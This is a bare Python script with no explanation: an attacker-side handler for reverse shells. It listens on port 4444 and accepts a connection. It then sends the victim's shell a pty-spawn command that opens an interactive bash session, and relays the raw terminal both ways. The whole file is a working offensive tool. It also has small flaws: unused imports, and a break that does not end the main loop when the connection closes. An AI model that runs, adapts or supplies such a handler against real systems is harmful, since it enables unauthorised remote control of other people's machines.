import socket
import select
import os
import termios
import tty
import signal
import argparse
import time


def build_listener(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    return s


s = build_listener("0.0.0.0", 4444)


print("[*] listening on 4444")
conn, addr = s.accept()

conn.sendall(b'''python3 -c 'import pty;pty.spawn("/bin/bash")'\n''')
time.sleep(1.0)

old = termios.tcgetattr(0)
tty.setraw(0)
try:
    while True:
        r, _, _ = select.select([0, conn], [], [])
        for fd in r:
            if fd == 0:
                data = os.read(0, 4096)
                conn.sendall(data)
            else:
                data = conn.recv(4096)
                if not data:
                    break
                os.write(1, data)
finally:
    termios.tcsetattr(0, termios.TCSADRAIN, old)

